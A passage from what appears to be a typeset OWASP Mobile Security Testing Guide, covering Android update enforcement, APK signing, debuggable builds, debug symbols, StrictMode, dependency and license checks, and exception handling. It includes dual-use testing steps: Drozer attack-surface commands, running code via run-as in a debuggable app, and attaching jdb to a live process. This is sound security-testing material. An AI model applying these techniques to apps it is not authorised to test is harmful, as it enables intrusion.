\NormalTok{      .}\FunctionTok{getAppUpdateInfo}\NormalTok{()}
\NormalTok{      .}\FunctionTok{addOnSuccessListener}\NormalTok{(}
\NormalTok{          appUpdateInfo {-}> \{}
\NormalTok{            ...}
            \KeywordTok{if}\NormalTok{ (appUpdateInfo.}\FunctionTok{updateAvailability}\NormalTok{()}
\NormalTok{                == UpdateAvailability.}\FunctionTok{DEVELOPER\_TRIGGERED\_UPDATE\_IN\_PROGRESS}\NormalTok{) \{}
                \CommentTok{// If an in{-}app update is already running, resume the update.}
\NormalTok{                manager.}\FunctionTok{startUpdateFlowForResult}\NormalTok{(}
\NormalTok{                    appUpdateInfo,}
\NormalTok{                    IMMEDIATE,}
                    \KeywordTok{this}\NormalTok{,}
\NormalTok{                    MY\_REQUEST\_CODE);}
\NormalTok{            \}}
\NormalTok{          \});}
\NormalTok{\}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

\begin{quote}
Source:
\url{https://developer.android.com/guide/app-bundle/in-app-updates}
\end{quote}

When checking for a proper update mechanism, make sure the usage of the
\texttt{AppUpdateManager} is present. If it is not yet, then this means
that users might be able to remain on an older version of the
application with the given vulnerabilities. Next, pay attention to the
\texttt{AppUpdateType.IMMEDIATE} use: if a security update comes in,
then this flag should be used in order to make sure that the user cannot
go forward with using the app without updating it. As you can see, in
part 3 of the example: make sure that cancellations or errors do end up
in re-checks and that a user cannot move forward in case of a critical
security update. Finally, in part 4: you can see that for every entry
point in the application, an update-mechanism should be enforced, so
that bypassing it will be harder.

\hypertarget{dynamic-analysis-38}{%
\paragraph{Dynamic analysis}\label{dynamic-analysis-38}}

In order to test for proper updating: try downloading an older version
of the application with a security vulnerability, either by a release
from the developers or by using a third party app-store. Next, verify
whether or not you can continue to use the application without updating
it. If an update prompt is given, verify if you can still use the
application by canceling the prompt or otherwise circumventing it
through normal application usage. This includes validating whether the
backend will stop calls to vulnerable backends and/or whether the
vulnerable app-version itself is blocked by the backend. Lastly, see if
you can play with the version number of a man-in-the-middled app and see
how the backend responds to this (and if it is recorded at all for
instance).

\hypertarget{references-13}{%
\subsubsection{References}\label{references-13}}

\hypertarget{android-app-bundles-and-updates}{%
\paragraph{Android App Bundles and
updates}\label{android-app-bundles-and-updates}}

\begin{itemize}
\tightlist
\item
  \url{https://developer.android.com/guide/app-bundle/in-app-updates}
\end{itemize}

\hypertarget{android-fragment-injection}{%
\paragraph{Android Fragment
Injection}\label{android-fragment-injection}}

\begin{itemize}
\tightlist
\item
  \url{https://www.synopsys.com/blogs/software-security/fragment-injection/}
\item
  \url{https://securityintelligence.com/wp-content/uploads/2013/12/android-collapses-into-fragments.pdf}
\end{itemize}

\hypertarget{android-permissions-documentation}{%
\paragraph{Android Permissions
Documentation}\label{android-permissions-documentation}}

\begin{itemize}
\tightlist
\item
  \url{https://developer.android.com/training/permissions/usage-notes}
\item
  \url{https://developer.android.com/training/permissions/requesting\#java}
\item
  \url{https://developer.android.com/guide/topics/permissions/overview\#permission-groups}
\item
  \url{https://developer.android.com/guide/topics/manifest/provider-element\#gprmsn}
\item
  \url{https://developer.android.com/reference/android/content/Context\#revokeUriPermission(android.net.Uri,\%20int)}
\item
  \url{https://developer.android.com/reference/android/content/Context\#checkUriPermission(android.net.Uri,\%20int,\%20int,\%20int)}
\item
  \url{https://developer.android.com/guide/components/broadcasts\#restricting_broadcasts_with_permissions}
\item
  \url{https://developer.android.com/guide/topics/permissions/overview}
\item
  \url{https://developer.android.com/guide/topics/manifest/manifest-intro\#filestruct}
\end{itemize}

\hypertarget{android-bundles-and-instant-apps}{%
\paragraph{Android Bundles and Instant
Apps}\label{android-bundles-and-instant-apps}}

\begin{itemize}
\tightlist
\item
  \url{https://developer.android.com/topic/google-play-instant/getting-started/instant-enabled-app-bundle}
\item
  \url{https://developer.android.com/topic/google-play-instant/guides/multiple-entry-points}
\item
  \url{https://developer.android.com/studio/projects/dynamic-delivery}
\end{itemize}

\hypertarget{android-permissions-changes-in-android-8}{%
\paragraph{Android permissions changes in Android
8}\label{android-permissions-changes-in-android-8}}

\begin{itemize}
\tightlist
\item
  \url{https://developer.android.com/about/versions/oreo/android-8.0-changes}
\end{itemize}

\hypertarget{owasp-masvs-10}{%
\paragraph{OWASP MASVS}\label{owasp-masvs-10}}

\begin{itemize}
\tightlist
\item
  MSTG-PLATFORM-1: ``The app only requests the minimum set of
  permissions necessary.''
\item
  MSTG-PLATFORM-2: ``All inputs from external sources and the user are
  validated and if necessary sanitized. This includes data received via
  the UI, IPC mechanisms such as intents, custom URLs, and network
  sources.''
\item
  MSTG-PLATFORM-3: ``The app does not export sensitive functionality via
  custom URL schemes, unless these mechanisms are properly protected.''
\item
  MSTG-PLATFORM-4: ``The app does not export sensitive functionality
  through IPC facilities, unless these mechanisms are properly
  protected.''
\item
  MSTG-PLATFORM-5: ``JavaScript is disabled in WebViews unless
  explicitly required.''
\item
  MSTG-PLATFORM-6: ``WebViews are configured to allow only the minimum
  set of protocol handlers required (ideally, only https is supported).
  Potentially dangerous handlers, such as file, tel and app-id, are
  disabled.''
\item
  MSTG-PLATFORM-7: ``If native methods of the app are exposed to a
  WebView, verify that the WebView only renders JavaScript contained
  within the app package.''
\item
  MSTG-PLATFORM-8: ``Object deserialization, if any, is implemented
  using safe serialization APIs.''
\item
  MSTG-ARCH-9: ``A mechanism for enforcing updates of the mobile app
  exists.''
\end{itemize}

\hypertarget{tools-6}{%
\paragraph{Tools}\label{tools-6}}

\begin{itemize}
\tightlist
\item
  Drozer - \url{https://github.com/mwrlabs/drozer}
\end{itemize}

\hypertarget{code-quality-and-build-settings-of-android-apps}{%
\subsection{Code Quality and Build Settings of Android
Apps}\label{code-quality-and-build-settings-of-android-apps}}

\hypertarget{making-sure-that-the-app-is-properly-signed-mstg-code-1}{%
\subsubsection{Making Sure That the App is Properly Signed
(MSTG-CODE-1)}\label{making-sure-that-the-app-is-properly-signed-mstg-code-1}}

\hypertarget{overview-34}{%
\paragraph{Overview}\label{overview-34}}

Android requires all APKs to be digitally signed with a certificate
before they are installed or run. The digital signature is used to
verify the owner's identity for application updates. This process can
prevent an app from being tampered with or modified to include malicious
code.

When an APK is signed, a public-key certificate is attached to it. This
certificate uniquely associates the APK with the developer and the
developer's private key. When an app is being built in debug mode, the
Android SDK signs the app with a debug key created specifically for
debugging purposes. An app signed with a debug key is not meant to be
distributed and won't be accepted in most app stores, including the
Google Play Store.

The
\href{https://developer.android.com/studio/publish/app-signing.html}{final
release build} of an app must be signed with a valid release key. In
Android Studio, the app can be signed manually or via creation of a
signing configuration that's assigned to the release build type.

Prior Android 9 (API level 28) all app updates on Android need to be
signed with the same certificate, so a
\href{https://developer.android.com/studio/publish/app-signing\#considerations}{validity
period of 25 years or more is recommended}. Apps published on Google
Play must be signed with a key that that has a validity period ending
after October 22th, 2033.

Three APK signing schemes are available:

\begin{itemize}
\tightlist
\item
  JAR signing (v1 scheme),
\item
  APK Signature Scheme v2 (v2 scheme),
\item
  APK Signature Scheme v3 (v3 scheme).
\end{itemize}

The v2 signature, which is supported by Android 7.0 (API level 24) and
above, offers improved security and performance compared to v1 scheme.
The V3 signature, which is supported by Android 9 (API level 28) and
above, gives apps the ability to change their signing keys as part of an
APK update. This functionality assures compatibility and apps continuous
availability by allowing both the new and the old keys to be used. Note
that it is only available via apksigner at the time of writing.

For each signing scheme the release builds should always be signed via
all its previous schemes as well.

\hypertarget{static-analysis-42}{%
\paragraph{Static Analysis}\label{static-analysis-42}}

Make sure that the release build has been signed via both the v1 and v2
schemes for Android 7.0 (API level 24) and above and via all the three
schemes for Android 9 (API level 28) and above, and that the
code-signing certificate in the APK belongs to the developer.

APK signatures can be verified with the \texttt{apksigner} tool. It is
located at \texttt{{[}SDK-Path{]}/build-tools/{[}version{]}}.

\begin{verbatim}
$ apksigner verify --verbose Desktop/example.apk
Verifies
Verified using v1 scheme (JAR signing): true
Verified using v2 scheme (APK Signature Scheme v2): true
Verified using v3 scheme (APK Signature Scheme v3): true
Number of signers: 1
\end{verbatim}

The contents of the signing certificate can be examined with
\texttt{jarsigner}. Note that the Common Name (CN) attribute is set to
``Android Debug'' in the debug certificate.

The output for an APK signed with a debug certificate is shown below:

\begin{verbatim}
$ jarsigner -verify -verbose -certs example.apk

sm     11116 Fri Nov 11 12:07:48 ICT 2016 AndroidManifest.xml

      X.509, CN=Android Debug, O=Android, C=US
      [certificate is valid from 3/24/16 9:18 AM to 8/10/43 9:18 AM]
      [CertPath not validated: Path doesn\'t chain with any of the trust anchors]
(...)
\end{verbatim}

Ignore the ``CertPath not validated'' error. This error occurs with Java
SDK 7 and above. Instead of \texttt{jarsigner}, you can rely on the
\texttt{apksigner} to verify the certificate chain.

The signing configuration can be managed through Android Studio or the
\texttt{signingConfig} block in \texttt{build.gradle}. To activate both
the v1 and v2 schemes, the following values must be set:

\begin{verbatim}
v1SigningEnabled true
v2SigningEnabled true
\end{verbatim}

Several best practices for
\href{https://developer.android.com/tools/publishing/preparing.html\#publishing-configure}{configuring
the app for release} are available in the official Android developer
documentation.

Last but not least: make sure that the application is never deployed
with your internal testing certificates.

\hypertarget{dynamic-analysis-39}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-39}}

Static analysis should be used to verify the APK signature.

\hypertarget{testing-whether-the-app-is-debuggable-mstg-code-2}{%
\subsubsection{Testing Whether the App is Debuggable
(MSTG-CODE-2)}\label{testing-whether-the-app-is-debuggable-mstg-code-2}}

\hypertarget{overview-35}{%
\paragraph{Overview}\label{overview-35}}

The \texttt{android:debuggable} attribute in the
\href{https://developer.android.com/guide/topics/manifest/application-element.html}{\texttt{Application}
element} that is defined in the Android manifest determines whether the
app can be debugged or not.

\hypertarget{static-analysis-43}{%
\paragraph{Static Analysis}\label{static-analysis-43}}

Check \texttt{AndroidManifest.xml} to determine whether the
\texttt{android:debuggable} attribute has been set and to find the
attribute's value:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{    ...}
    \KeywordTok{<application}\OtherTok{ android:allowBackup=}\StringTok{"true"}\OtherTok{ android:debuggable=}\StringTok{"true"}\OtherTok{ android:icon=}\StringTok{"@drawable/ic\_launcher"}\OtherTok{ android:label=}\StringTok{"@string/app\_name"}\OtherTok{ android:theme=}\StringTok{"@style/AppTheme"}\KeywordTok{>}
\NormalTok{    ...}
\end{Highlighting}
\end{Shaded}

For a release build, this attribute should always be set to
\texttt{"false"} (the default value).

\hypertarget{dynamic-analysis-40}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-40}}

Drozer can be used to determine whether an application is debuggable.
The Drozer module \texttt{app.package.attacksurface} also displays
information about IPC components exported by the application.

\begin{verbatim}
dz> run app.package.attacksurface com.mwr.dz
Attack Surface:
  1 activities exported
  1 broadcast receivers exported
  0 content providers exported
  0 services exported
    is debuggable
\end{verbatim}

To scan for all debuggable applications on a device, use the
\texttt{app.package.debuggable} module:

\begin{verbatim}
dz> run app.package.debuggable
Package: com.mwr.dz
  UID: 10083
  Permissions:
   - android.permission.INTERNET
Package: com.vulnerable.app
  UID: 10084
  Permissions:
   - android.permission.INTERNET
\end{verbatim}

If an application is debuggable, executing application commands is
trivial. In the \texttt{adb} shell, execute \texttt{run-as} by appending
the package name and application command to the binary name:

\begin{verbatim}
$ run-as com.vulnerable.app id
uid=10084(u0_a84) gid=10084(u0_a84) groups=10083(u0_a83),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats) context=u:r:untrusted_app:s0:c512,c768
\end{verbatim}

\href{https://developer.android.com/tools/debugging/debugging-studio.html}{Android
Studio} can also be used to debug an application and verify debugging
activation for an app.

Another method for determining whether an application is debuggable is
attaching \texttt{jdb} to the running process. If this is successful,
debugging will be activated.

The following procedure can be used to start a debug session with
\texttt{jdb}:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  Using \texttt{adb} and \texttt{jdwp}, identify the PID of the active
  application that you want to debug:

\begin{verbatim}
$ adb jdwp
2355
16346  <== last launched, corresponds to our application
\end{verbatim}
\item
  Create a communication channel by using \texttt{adb} between the
  application process (with the PID) and the analysis workstation by
  using a specific local port:

\begin{verbatim}
# adb forward tcp:[LOCAL_PORT] jdwp:[APPLICATION_PID]
$ adb forward tcp:55555 jdwp:16346
\end{verbatim}
\item
  Using \texttt{jdb}, attach the debugger to the local communication
  channel port and start a debug session:

\begin{verbatim}
$ jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=55555
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
> help
\end{verbatim}
\end{enumerate}

A few notes about debugging:

\begin{itemize}
\tightlist
\item
  The tool \href{https://github.com/skylot/jadx}{\texttt{JADX}} can be
  used to identify interesting locations for breakpoint insertion.
\item
  Usage of basic commands for jdb can be found at
  \href{https://www.tutorialspoint.com/jdb/jdb_basic_commands.htm}{Tutorialspoint}.
\item
  If you get an error telling that ``the connection to the debugger has
  been closed'' while \texttt{jdb} is being bound to the local
  communication channel port, kill all adb sessions and start a single
  new session.
\end{itemize}

\hypertarget{testing-for-debugging-symbols-mstg-code-3}{%
\subsubsection{Testing for Debugging Symbols
(MSTG-CODE-3)}\label{testing-for-debugging-symbols-mstg-code-3}}

\hypertarget{overview-36}{%
\paragraph{Overview}\label{overview-36}}

Generally, you should provide compiled code with as little explanation
as possible. Some metadata, such as debugging information, line numbers,
and descriptive function or method names, make the binary or byte-code
easier for the reverse engineer to understand, but these aren't needed
in a release build and can therefore be safely omitted without impacting
the app's functionality.

To inspect native binaries, use a standard tool like \texttt{nm} or
\texttt{objdump} to examine the symbol table. A release build should
generally not contain any debugging symbols. If the goal is to obfuscate
the library, removing unnecessary dynamic symbols is also recommended.

\hypertarget{static-analysis-44}{%
\paragraph{Static Analysis}\label{static-analysis-44}}

Symbols are usually stripped during the build process, so you need the
compiled byte-code and libraries to make sure that unnecessary metadata
has been discarded.

First, find the \texttt{nm} binary in your Android NDK and export it (or
create an alias).

\begin{verbatim}
export $NM = $ANDROID_NDK_DIR/toolchains/arm-linux-androideabi-4.9/prebuilt/darwin-x86_64/bin/arm-linux-androideabi-nm
\end{verbatim}

To display debug symbols:

\begin{verbatim}
$ $NM -a libfoo.so
/tmp/toolchains/arm-linux-androideabi-4.9/prebuilt/darwin-x86_64/bin/arm-linux-androideabi-nm: libfoo.so: no symbols
\end{verbatim}

To display dynamic symbols:

\begin{verbatim}
$ $NM -D libfoo.so
\end{verbatim}

Alternatively, open the file in your favorite disassembler and check the
symbol tables manually.

Dynamic symbols can be stripped via the \texttt{visibility} compiler
flag. Adding this flag causes gcc to discard the function names while
preserving the names of functions declared as \texttt{JNIEXPORT}.

Make sure that the following has been added to build.gradle:

\begin{verbatim}
externalNativeBuild {
    cmake {
        cppFlags "-fvisibility=hidden"
    }
}
\end{verbatim}

\hypertarget{dynamic-analysis-41}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-41}}

Static analysis should be used to verify debugging symbols.

\hypertarget{testing-for-debugging-code-and-verbose-error-logging-mstg-code-4}{%
\subsubsection{Testing for Debugging Code and Verbose Error Logging
(MSTG-CODE-4)}\label{testing-for-debugging-code-and-verbose-error-logging-mstg-code-4}}

\hypertarget{overview-37}{%
\paragraph{Overview}\label{overview-37}}

StrictMode is a developer tool for detecting violations, e.g.~accidental
disk or network access on the application's main thread. It can also be
used to check for good coding practices, such as implementing performant
code.

Here is
\href{https://developer.android.com/reference/android/os/StrictMode.html}{an
example of \texttt{StrictMode}} with policies enabled for disk and
network access to the main thread:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \DataTypeTok{void} \FunctionTok{onCreate}\NormalTok{() \{}
     \KeywordTok{if}\NormalTok{ (DEVELOPER\_MODE) \{}
\NormalTok{         StrictMode.}\FunctionTok{setThreadPolicy}\NormalTok{(}\KeywordTok{new}\NormalTok{ StrictMode.}\FunctionTok{ThreadPolicy}\NormalTok{.}\FunctionTok{Builder}\NormalTok{()}
\NormalTok{                 .}\FunctionTok{detectDiskReads}\NormalTok{()}
\NormalTok{                 .}\FunctionTok{detectDiskWrites}\NormalTok{()}
\NormalTok{                 .}\FunctionTok{detectNetwork}\NormalTok{()   }\CommentTok{// or .detectAll() for all detectable problems}
\NormalTok{                 .}\FunctionTok{penaltyLog}\NormalTok{()}
\NormalTok{                 .}\FunctionTok{build}\NormalTok{());}
\NormalTok{         StrictMode.}\FunctionTok{setVmPolicy}\NormalTok{(}\KeywordTok{new}\NormalTok{ StrictMode.}\FunctionTok{VmPolicy}\NormalTok{.}\FunctionTok{Builder}\NormalTok{()}
\NormalTok{                 .}\FunctionTok{detectLeakedSqlLiteObjects}\NormalTok{()}
\NormalTok{                 .}\FunctionTok{detectLeakedClosableObjects}\NormalTok{()}
\NormalTok{                 .}\FunctionTok{penaltyLog}\NormalTok{()}
\NormalTok{                 .}\FunctionTok{penaltyDeath}\NormalTok{()}
\NormalTok{                 .}\FunctionTok{build}\NormalTok{());}
\NormalTok{     \}}
     \KeywordTok{super}\NormalTok{.}\FunctionTok{onCreate}\NormalTok{();}
\NormalTok{ \}}
\end{Highlighting}
\end{Shaded}

Inserting the policy in the \texttt{if} statement with the
\texttt{DEVELOPER\_MODE} condition is recommended. To disable
\texttt{StrictMode}, \texttt{DEVELOPER\_MODE} must be disabled for the
release build.

\hypertarget{static-analysis-45}{%
\paragraph{Static Analysis}\label{static-analysis-45}}

To determine whether \texttt{StrictMode} is enabled, you can look for
the \texttt{StrictMode.setThreadPolicy} or
\texttt{StrictMode.setVmPolicy} methods. Most likely, they will be in
the \texttt{onCreate} method.

The \href{https://javabeat.net/strictmode-android-1/}{detection methods
for the thread policy} are

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{detectDiskWrites}\NormalTok{()}
\FunctionTok{detectDiskReads}\NormalTok{()}
\FunctionTok{detectNetwork}\NormalTok{()}
\end{Highlighting}
\end{Shaded}

The \href{https://javabeat.net/strictmode-android-1/}{penalties for
thread policy violation} are

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{penaltyLog}\NormalTok{() }\CommentTok{// Logs a message to LogCat}
\FunctionTok{penaltyDeath}\NormalTok{() }\CommentTok{// Crashes application, runs at the end of all enabled penalties}
\FunctionTok{penaltyDialog}\NormalTok{() }\CommentTok{// Shows a dialog}
\end{Highlighting}
\end{Shaded}

Have a look at the
\href{https://code.tutsplus.com/tutorials/android-best-practices-strictmode--mobile-7581}{best
practices} for using StrictMode.

\hypertarget{dynamic-analysis-42}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-42}}

There are several ways of detecting \texttt{StrictMode}; the best choice
depends on how the policies' roles are implemented. They include

\begin{itemize}
\tightlist
\item
  Logcat,
\item
  a warning dialog,
\item
  application crash.
\end{itemize}

\hypertarget{checking-for-weaknesses-in-third-party-libraries-mstg-code-5}{%
\subsubsection{Checking for Weaknesses in Third Party Libraries
(MSTG-CODE-5)}\label{checking-for-weaknesses-in-third-party-libraries-mstg-code-5}}

\hypertarget{overview-38}{%
\paragraph{Overview}\label{overview-38}}

Android apps often make use of third party libraries. These third party
libraries accelerate development as the developer has to write less code
in order to solve a problem. There are two categories of libraries:

\begin{itemize}
\tightlist
\item
  Libraries that are not (or should not) be packed within the actual
  production application, such as \texttt{Mockito} used for testing and
  libraries like \texttt{JavaAssist} used to compile certain other
  libraries.
\item
  Libraries that are packed within the actual production application,
  such as \texttt{Okhttp3}.
\end{itemize}

These libraries can lead to unwanted side-effects:

\begin{itemize}
\tightlist
\item
  A library can contain a vulnerability, which will make the application
  vulnerable. A good example are the versions of \texttt{OKHTTP} prior
  to 2.7.5 in which TLS chain pollution was possible to bypass SSL
  pinning.
\item
  A library can no longer be maintained or hardly be used, which is why
  no vulnerabilities are reported and/or fixed. This can lead to having
  bad and/or vulnerable code in your application through the library.
\item
  A library can use a license, such as LGPL2.1, which requires the
  application author to provide access to the source code for those who
  use the application and request insight in its sources. In fact the
  application should then be allowed to be redistributed with
  modifications to its sourcecode. This can endanger the intellectual
  property (IP) of the application.
\end{itemize}

Please note that this issue can hold on multiple levels: When you use
webviews with JavaScript running in the webview, the JavaScript
libraries can have these issues as well. The same holds for
plugins/libraries for Cordova, React-native and Xamarin apps.

\hypertarget{static-analysis-46}{%
\paragraph{Static Analysis}\label{static-analysis-46}}

\hypertarget{detecting-vulnerabilities-of-third-party-libraries}{%
\subparagraph{Detecting vulnerabilities of third party
libraries}\label{detecting-vulnerabilities-of-third-party-libraries}}

Detecting vulnerabilities in third party dependencies can be done by
means of the OWASP Dependency checker. This is best done by using a
gradle plugin, such as \texttt{dependency-check-gradle}. In order to use
the plugin, the following steps need to be applied: Install the plugin
from the Maven central repository by adding the following script to your
build.gradle:

\begin{verbatim}
buildscript {
    repositories {
        mavenCentral()
    }
    dependencies {
        classpath 'org.owasp:dependency-check-gradle:3.2.0'
    }
}

apply plugin: 'org.owasp.dependencycheck'
\end{verbatim}

Once gradle has invoked the plugin, you can create a report by running:

\begin{verbatim}
$ gradle assemble
$ gradle dependencyCheckAnalyze --info
\end{verbatim}

The report will be in \texttt{build/reports} unless otherwise
configured. Use the report in order to analyze the vulnerabilities
found. See remediation on what to do given the vulnerabilities found
with the libraries.

Please be advised that the plugin requires to download a vulnerability
feed. Consult the documentation in case issues arise with the plugin.

Alternatively there are commercial tools which might have a better
coverage of the dependencies found for the libraries being used, such as
SourceClear or Blackduck. The actual result of using either the OWASP
Dependency Checker or another tool varies on the type of (NDK related or
SDK related) libraries.

Lastly, please note that for hybrid applications, one will have to check
the JavaScript dependencies with RetireJS. Similarly for Xamarin, one
will have to check the C\# dependencies.

When a library is found to contain vulnerabilities, then the following
reasoning applies:

\begin{itemize}
\tightlist
\item
  Is the library packaged with the application? Then check whether the
  library has a version in which the vulnerability is patched. If not,
  check whether the vulnerability actually affects the application. If
  that is the case or might be the case in the future, then look for an
  alternative which provides similar functionality, but without the
  vulnerabilities.
\item
  Is the library not packaged with the application? See if there is a
  patched version in which the vulnerability is fixed. If this is not
  the case, check if the implications of the vulnerability for the
  build-process. Could the vulnerability impede a build or weaken the
  security of the build-pipeline? Then try looking for an alternative in
  which the vulnerability is fixed.
\end{itemize}

When the sources are not available, one can decompile the app and check
the JAR files. When Dexguard or Proguard are applied properly, then
version information about the library is often obfuscated and therefore
gone. Otherwise you can still find the information very often in the
comments of the Java files of given libraries. Tools such as MobSF can
help in analyzing the possible libraries packed with the application. If
you can retrieve the version of the library, either via comments, or via
specific methods used in certain versions, you can look them up for CVEs
by hand.

If the application is a high-risk application, you will end up vetting
the library manually. In that case, there are specific requirements for
native code, which you can find in the chapter
``\href{0x04h-Testing-Code-Quality.md}{Testing Code Quality}''. Next to
that, it is good to vet whether all best practices for software
engineering are applied.

\hypertarget{detecting-the-licenses-used-by-the-libraries-of-the-application}{%
\subparagraph{Detecting the Licenses Used by the Libraries of the
Application}\label{detecting-the-licenses-used-by-the-libraries-of-the-application}}

In order to ensure that the copyright laws are not infringed, one can
best check the dependencies by using a plugin which can iterate over the
different libraries, such as \texttt{License\ Gradle\ Plugin}. This
plugin can be used by taking the following steps.

In your \texttt{build.gradle} file add:

\begin{verbatim}
plugins {
    id "com.github.hierynomus.license-report" version"{license_plugin_version}"
}
\end{verbatim}

Now, after the plugin is picked up, use the following commands:

\begin{verbatim}
$ gradle assemble
$ gradle downloadLicenses
\end{verbatim}

Now a license-report will be generated, which can be used to consult the
licenses used by the third party libraries. Please check the license
agreements to see whether a copyright notice needs to be included into
the app and whether the license type requires to open-source the code of
the application.

Similar to dependency checking, there are commercial tools which are
able to check the licenses as well, such as SourceClear, Snyk or
Blackduck.

\begin{quote}
Note: If in doubt about the implications of a license model used by a
third party library, then consult with a legal specialist.
\end{quote}

When a library contains a license in which the application IP needs to
be open-sourced, check if there is an alternative for the library which
can be used to provide similar functionalities.

Note: In case of a hybrid app, please check the build tools used: most
of them do have a license enumeration plugin to find the licenses being
used.

When the sources are not available, one can decompile the app and check
the JAR files. When Dexguard or Proguard are applied properly, then
version information about the library is often gone. Otherwise you can
still find it very often in the comments of the Java files of given
libraries. Tools such as MobSF can help in analyzing the possible
libraries packed with the application. If you can retrieve the version
of the library, either via comments, or via specific methods used in
certain versions, you can look them up for their licenses being used by
hand.

\hypertarget{dynamic-analysis-43}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-43}}

The dynamic analysis of this section comprises validating whether the
copyrights of the licenses have been adhered to. This often means that
the application should have an \texttt{about} or \texttt{EULA} section
in which the copy-right statements are noted as required by the license
of the third party library.

\hypertarget{testing-exception-handling-mstg-code-6-and-mstg-code-7}{%
\subsubsection{Testing Exception Handling (MSTG-CODE-6 and
MSTG-CODE-7)}\label{testing-exception-handling-mstg-code-6-and-mstg-code-7}}

\hypertarget{overview-39}{%
\paragraph{Overview}\label{overview-39}}

Exceptions occur when an application gets into an abnormal or error
state. Both Java and C++ may throw exceptions. Testing exception
handling is about ensuring that the app will handle an exception and
transition to a safe state without exposing sensitive information via
the UI or the app's logging mechanisms.

\hypertarget{static-analysis-47}{%
\paragraph{Static Analysis}\label{static-analysis-47}}

Review the source code to understand the application and identify how it
handles different types of errors (IPC communications, remote services
invocation, etc.). Here are some examples of things to check at this
stage:

\begin{itemize}
\tightlist
\item
  Make sure that the application uses a well-designed and unified scheme
  to
  \href{https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=18581047}{handle
  exceptions}.
\item
  Plan for standard \texttt{RuntimeException}s
  (e.g.\texttt{NullPointerException},
  \texttt{IndexOutOfBoundsException},
  \texttt{ActivityNotFoundException}, \texttt{CancellationException},
  \texttt{SQLException}) by creating proper null checks, bound checks,
  and the like. An
  \href{https://developer.android.com/reference/java/lang/RuntimeException.html}{overview
  of the available subclasses of \texttt{RuntimeException}} can be found
  in the Android developer documentation. A child of
  \texttt{RuntimeException} should be thrown intentionally, and the
  intent should be handled by the calling method.
\item
  Make sure that for every non-runtime \texttt{Throwable} there's a
  proper catch handler, which ends up handling the actual exception
  properly.
\item
  When an exception is thrown, make sure that the application has
  centralized handlers for exceptions that cause similar behavior. This
  can be a static class. For exceptions specific to the method, provide
  specific catch blocks.
\item
  Make sure that the application doesn't expose sensitive information
  while handling exceptions in its UI or log-statements. Ensure that
  exceptions are still verbose enough to explain the issue to the user.
\item
  Make sure that all confidential information handled by high-risk
  applications is always wiped during execution of the \texttt{finally}
  blocks.
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
\DataTypeTok{byte}\NormalTok{[] secret;}
\KeywordTok{try}\NormalTok{\{}
    \CommentTok{//use secret}
\NormalTok{\} }\KeywordTok{catch}\NormalTok{ (SPECIFICEXCEPTIONCLASS | SPECIFICEXCEPTIONCLASS2 e) \{}
    \CommentTok{// handle any issues}
\NormalTok{\} }\KeywordTok{finally}\NormalTok{ \{}
    \CommentTok{//clean the secret.}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Adding a general exception handler for uncaught exceptions is a best
practice for resetting the application's state when a crash is imminent:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \KeywordTok{class}\NormalTok{ MemoryCleanerOnCrash }\KeywordTok{implements} \BuiltInTok{Thread}\NormalTok{.}\FunctionTok{UncaughtExceptionHandler}\NormalTok{ \{}

    \KeywordTok{private} \DataTypeTok{static} \DataTypeTok{final}\NormalTok{ MemoryCleanerOnCrash S\_INSTANCE = }\KeywordTok{new} \FunctionTok{MemoryCleanerOnCrash}\NormalTok{();}
    \KeywordTok{private} \DataTypeTok{final} \BuiltInTok{List}\NormalTok{<}\BuiltInTok{Thread}\NormalTok{.}\FunctionTok{UncaughtExceptionHandler}\NormalTok{> mHandlers = }\KeywordTok{new} \BuiltInTok{ArrayList}\NormalTok{<>();}

    \CommentTok{//initialize the handler and set it as the default exception handler}
    \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{void} \FunctionTok{init}\NormalTok{() \{}
\NormalTok{        S\_INSTANCE.}\FunctionTok{mHandlers}\NormalTok{.}\FunctionTok{add}\NormalTok{(}\BuiltInTok{Thread}\NormalTok{.}\FunctionTok{getDefaultUncaughtExceptionHandler}\NormalTok{());}
        \BuiltInTok{Thread}\NormalTok{.}\FunctionTok{setDefaultUncaughtExceptionHandler}\NormalTok{(S\_INSTANCE);}
\NormalTok{    \}}

     \CommentTok{//make sure that you can still add exception handlers on top of it (required for ACRA for instance)}
    \KeywordTok{public} \DataTypeTok{void} \FunctionTok{subscribeCrashHandler}\NormalTok{(}\BuiltInTok{Thread}\NormalTok{.}\FunctionTok{UncaughtExceptionHandler}\NormalTok{ handler) \{}
\NormalTok{        mHandlers.}\FunctionTok{add}\NormalTok{(handler);}
\NormalTok{    \}}

    \AttributeTok{@Override}
    \KeywordTok{public} \DataTypeTok{void} \FunctionTok{uncaughtException}\NormalTok{(}\BuiltInTok{Thread}\NormalTok{ thread, }\BuiltInTok{Throwable}\NormalTok{ ex) \{}

            \CommentTok{//handle the cleanup here}
            \CommentTok{//....}
            \CommentTok{//and then show a message to the user if possible given the context}

        \KeywordTok{for}\NormalTok{ (}\BuiltInTok{Thread}\NormalTok{.}\FunctionTok{UncaughtExceptionHandler}\NormalTok{ handler : mHandlers) \{}
\NormalTok{            handler.}\FunctionTok{uncaughtException}\NormalTok{(thread, ex);}
\NormalTok{        \}}
\NormalTok{    \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Now the handler's initializer must be called in your custom
\texttt{Application} class (e.g., the class that extends
\texttt{Application}):

\begin{Shaded}
\begin{Highlighting}[]
\AttributeTok{@Override}
